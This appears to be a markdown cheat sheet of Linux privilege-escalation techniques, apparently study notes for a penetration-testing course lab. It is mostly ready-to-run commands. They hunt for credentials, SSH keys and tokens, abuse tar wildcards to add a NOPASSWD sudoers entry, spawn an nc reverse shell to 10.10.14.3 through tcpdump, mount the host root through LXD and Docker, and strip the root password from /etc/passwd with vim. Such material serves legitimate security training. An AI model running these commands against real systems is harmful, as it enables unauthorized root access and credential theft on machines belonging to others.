# Enviroment-Enumeration
Comprehensive system reconnaissance to identify users, services, configurations, and potential attack vectors for privilege escalation.

## Basic System Information
- **Current User**: Identifies the user you are running as.  
  `whoami`
- **User Groups**: Shows groups the current user belongs to.  
  `id`
- **Hostname**: Reveals the server's name, potentially indicating naming conventions.  
  `hostname`
- **Network Interfaces**: Displays network configuration and subnets.  
  `ip a` or `ifconfig`
- **Sudo Privileges**: Lists commands the user can run with sudo without a password.  
  `sudo -l`

## Operating System Details
- **OS Version**: Provides distribution and version details.  
  `cat /etc/os-release`
- **Kernel Version**: Shows kernel details for potential exploit research.  
  `uname -a`
- **CPU Information**: Displays CPU architecture and details.  
  `lscpu`
- **Available Shells**: Lists valid login shells on the system.  
  `cat /etc/shells`

## Environment Variables
- **User PATH**: Shows directories searched for executables.  
  `echo $PATH`
- **All Environment Variables**: Lists all set variables, potentially revealing sensitive data.  
  `env`

## Storage and File Systems
- **Block Devices**: Enumerates disks, partitions, and mount points.  
  `lsblk`
- **File System Table**: Shows mounted file systems and options.  
  `cat /etc/fstab`
- **Mounted File Systems**: Displays currently mounted file systems and usage.  
  `df -h`
- **Unmounted File Systems**: Identifies potential unmounted file systems from fstab.  
  `cat /etc/fstab | grep -v "#" | column -t`
- **Running Services**: Identifies services, especially those running as root.  
  `ps aux`
- **Printer Information**: Shows attached printers and queued jobs.  
  `lpstat`

## Network Information
- **Routing Table**: Shows network routes and interfaces.  
  `route` or `netstat -rn`
- **ARP Table**: Lists hosts the system has communicated with.  
  `arp -a`

## Users and Groups
- **All Users**: Lists all users from passwd file.  
  `cat /etc/passwd`
- **Users with Login Shells**: Shows users with shells, for version vulnerability checks.  
  `grep "sh$" /etc/passwd`
- **All Groups**: Lists all groups and members.  
  `cat /etc/group`
- **Group Members**: Displays members of a specific group (e.g., sudo).  
  `getent group sudo`
- **Home Directories**: Lists user home directories for further enumeration.  
  `ls /home`

## Hidden and Temporary Files
- **Hidden Files**: Finds all hidden files, potentially containing sensitive info.  
  `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null`
- **Hidden Directories**: Locates hidden directories system-wide.  
  `find / -type d -name ".*" -ls 2>/dev/null`
- **Temporary Files**: Checks temp directories for logs or sensitive data.  
  `ls -l /tmp /var/tmp /dev/shm`

# Linux Services & Internals Enumeration

Detailed examination of running processes, scheduled tasks, installed software, and system configurations for privilege escalation opportunities.

## Network Information
- **Network Interfaces**: Displays network configuration, IP addresses, and potential additional subnets.  
  `ip a` or `ifconfig`
- **Hosts File**: Reveals local hostname mappings that may indicate network connections or configurations.  
  `cat /etc/hosts`

## User Activity
- **Last Login**: Shows last login times for users to gauge system usage and potential misconfigurations.  
  `lastlog`
- **Currently Logged In**: Identifies users currently active on the system.  
  `w` or `who`
- **Command History**: Reveals commands executed by users, potentially exposing passwords or sensitive actions.  
  `history`
- **History Files**: Locates special history files that may log user or script activities.  
  `find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null`

## System Tasks and Processes
- **Cron Jobs**: Lists scheduled tasks that may be exploitable due to misconfigurations.  
  `ls -la /etc/cron.daily/`
- **Process Information**: Provides details on running processes and system resources via the proc filesystem.  
  `find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"`
- **Running Services by User**: Identifies processes and services, especially those running as root.  
  `ps aux | grep root`

## Installed Software
- **Installed Packages**: Lists installed packages to identify potentially vulnerable software.  
  `apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list`
- **Sudo Version**: Checks the installed sudo version for known vulnerabilities.  
  `sudo -V`
- **System Binaries**: Lists executable binaries in common directories for potential exploitation.  
  `ls -l /bin /usr/bin /usr/sbin`
- **GTFObins Check**: Compares installed binaries against GTFObins for exploitable ones.  
  `for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done`

## System and Configuration Files
- **Configuration Files**: Locates configuration files that may contain sensitive data like keys or paths.  
  `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null`
- **Scripts**: Finds shell scripts that may reveal internal processes or have exploitable permissions.  
  `find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"`

## System Call Tracing
- **Trace System Calls**: Monitors system calls to identify security-related activities or attack vectors.  
  `strace ping -c1 <target_ip>`

# Credential Hunting

Systematic search for exposed credentials in configuration files, scripts, databases, SSH keys, and environment variables for lateral movement or privilege escalation.

## Common Credential Locations
- **Database Credentials**: Searches WordPress config for MySQL credentials.  
  `grep 'DB_USER\|DB_PASSWORD' wp-config.php`
- **Web Root Passwords**: Finds PHP files with password/user strings in web directories.  
  `find /var -name "*.php" -exec grep -l "password\|user" {} \; 2>/dev/null`
- **Mail/Spool Credentials**: Searches mail directories for password or key strings.  
  `find /var/spool /var/mail -type f 2>/dev/null | xargs grep -l "pass\|key" 2>/dev/null`
- **Backup Files**: Locates backup files that may contain original credentials.  
  `find / -type f \( -name "*.bak" -o -name "*.backup" \) -exec ls -l {} \; 2>/dev/null`
- **Log File Credentials**: Greps common log locations for plaintext credentials.  
  `grep -r "password\|key\|secret" /etc /home /var/log 2>/dev/null`

## SSH Keys

- **SSH Directory**: Lists SSH keys and related files in user home directory.  
  `ls ~/.ssh`
- **System SSH Keys**: Searches for private SSH keys across the filesystem.  
  `find / -type f -name "id_rsa" -o -name "id_dsa" 2>/dev/null`
- **Known Hosts**: Extracts host information from known_hosts for lateral movement.  
  `cat ~/.ssh/known_hosts | cut -d' ' -f1 | sort -u`
- **Key Permissions**: Checks permissions of SSH private keys.  
  `ls -la ~/.ssh/id_* | grep -v pub`

## Path Abuse

- **Current PATH**: Displays directories searched for executable commands.  
  `echo $PATH`
- **PATH Script Test**: Creates executable script in PATH directory for testing.  
  `echo 'netstat -tuln' > /usr/local/sbin/conncheck && chmod +x /usr/local/sbin/conncheck`
- **Prepend Current Dir**: Adds current directory to PATH for local binary priority.  
  `PATH=.:${PATH} && export PATH`
- **Malicious Binary**: Creates fake ls command that executes custom script.  
  `touch ls && echo 'echo "PATH ABUSE!!"' > ls && chmod +x ls`

## Wildcard Abuse

- **Tar Man Page**: Reviews tar checkpoint options for wildcard exploitation.  
  `man tar | grep -A5 checkpoint`
- **Cron Tar Jobs**: Finds cron jobs using tar command for wildcard abuse.  
  `crontab -l | grep tar`
- **Wildcard Payload**: Creates root.sh script for privilege escalation.  
  `echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh`
- **Checkpoint Action**: Creates tar option file to execute arbitrary command.  
  `echo "" > "--checkpoint-action=exec=sh root.sh"`
- **Checkpoint Trigger**: Creates tar option file to trigger checkpoint action.  
  `echo "" > --checkpoint=1`
- **Verify Payload**: Lists created wildcard abuse files in working directory.  
  `ls -la`

## General Credential Search
- **Config Files**: Finds all configuration files system-wide for credential hunting.  
  `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`
- **History Credentials**: Searches bash history files for exposed credentials.  
  `grep -r "pass\|key" ~/.bash_history /home/*/.sh_history 2>/dev/null`
- **Script Credentials**: Searches shell scripts for hardcoded credentials.  
  `find / -type f -name "*.sh" 2>/dev/null | xargs grep -l "pass\|key" 2>/dev/null`
- **XML Credentials**: Searches XML files for embedded credentials.  
  `find / -name "*.xml" -exec grep -l "password\|key" {} \; 2>/dev/null`
- **Environment Vars**: Dumps environment variables that may contain credentials.  
  `env | grep -E "(PASS|KEY|SECRET|TOKEN)"`

# Escaping Restricted Shells

A restricted shell limits user commands and directories for security. Common types include rbash (restricted Bourne shell), rksh (restricted Korn shell), and rzsh (restricted Z shell). These shells prevent directory changes, environment modifications, and external command execution.

## Restricted Shell Types
- **RBASH**: Limited Bourne shell preventing directory changes and environment modifications.
- **RKSH**: Restricted Korn shell blocking external commands and function creation.
- **RZSH**: Limited Z shell restricting scripts, aliases, and environment changes.

## Escaping Methods

### Command Injection
- **Inject via Backticks**: Uses command substitution to execute restricted commands within allowed ones.  
  `ls -l \`pwd\``

### Command Substitution
- **Backtick Execution**: Executes commands via backticks within permitted shell constructs.  
  `echo \`id\``

### Command Chaining
- **Semicolon Chaining**: Executes multiple commands separated by semicolons.  
  `ls; id`
- **Pipe Chaining**: Chains commands using pipes to bypass restrictions.  
  `ls | whoami`

### Environment Variables
- **Modify PATH**: Alters PATH to point to malicious scripts in writable directories.  
  `export PATH=/tmp:$PATH`
- **Variable Expansion**: Uses variable expansion to execute unintended commands.  
  `echo $SHELL`

### Shell Functions
- **Define Function**: Creates shell function containing restricted commands.  
  `func() { /bin/sh; }; func`

# Special Permissions

Exploitation of SetUID/SetGID binaries and GTFOBins for privilege escalation through misconfigured executable permissions and restricted shell escapes.

## SetUID Binaries
- **Find SetUID**: Locates setuid binaries owned by root for potential exploitation.  
  `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`

## SetGID Binaries
- **Find SetGID**: Identifies setgid binaries for group privilege escalation.  
  `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`

## GTFOBins
- **GTFOBins Reference**: Curated collection of binaries for shell escape and privilege escalation.
- **Apt-Get Escape**: Uses apt-get pre-invoke to spawn shell from restricted environment.  
  `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh`

# Sudo Rights Abuse

Sudo privileges allow running specific commands as root or other users. Misconfigurations can lead to privilege escalation through command options, PATH abuse, or unintended binary execution.

## Sudo Enumeration
- **List Sudo Privileges**: Shows commands current user can run with sudo.  
  `sudo -l`

## Tcpdump Abuse
- **Tcpdump Man Page**: Reviews tcpdump options for postrotate-command exploitation.  
  `man tcpdump | grep postrotate`
- **Create Reverse Shell**: Writes reverse shell script for tcpdump execution.  
  `echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f' > /tmp/.test`
- **Execute via Tcpdump**: Runs tcpdump with postrotate-command to execute shell.  
  `sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root`

# Privileged Groups

## LXC/LXD
- **Check LXD Group**: Verifies membership in lxd group for container privilege escalation.  
  `id`
- **Unzip Alpine Image**: Extracts Alpine Linux image for LXD container creation.  
  `unzip alpine.zip`
- **Initialize LXD**: Configures LXD environment for container management.  
  `lxd init`
- **Import Image**: Imports Alpine image into LXD for container creation.  
  `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`
- **Create Privileged Container**: Initializes privileged LXD container for host access.  
  `lxc init alpine r00t -c security.privileged=true`
- **Mount Host Filesystem**: Adds host root filesystem as device to container.  
  `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`
- **Start Container**: Launches LXD container for privileged access.  
  `lxc start r00t`
- **Execute Container Shell**: Spawns shell inside privileged container.  
  `lxc exec r00t /bin/sh`

## Docker
- **Docker Group Check**: Verifies docker group membership for container escalation.  
  `id | grep docker`
- **Mount Root Volume**: Creates Docker container with root directory mounted.  
  `docker run -v /root:/mnt -it ubuntu`

## Disk Group
- **Disk Group Access**: Uses debugfs to access filesystem with disk group privileges.  
  `debugfs /dev/sda1`

## ADM Group
- **ADM Group Check**: Verifies adm group membership for log file access.  
  `id | grep adm`
- **Read System Logs**: Accesses /var/log files with adm group privileges.  
  `cat /var/log/auth.log`

# Capabilities

Linux capabilities provide fine-grained privilege control. Misconfigured capabilities can be exploited for privilege escalation.

## Enumerating Capabilities
- **Find Capabilities**: Lists all binaries with set capabilities in system directories.  
  `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null`

## Capability Exploitation
- **Check Binary Capabilities**: Verifies specific binary has exploitable capabilities.  
  `getcap /usr/bin/vim.basic`
- **Vim DAC Override**: Uses vim's cap_dac_override to edit protected files.  
  `/usr/bin/vim.basic /etc/passwd`
- **Non-Interactive Edit**: Modifies /etc/passwd non-interactively to remove root password.  
  `echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd`
- **Verify Password Removal**: Confirms root account has no password set.  
  `cat /etc/passwd | head -n1`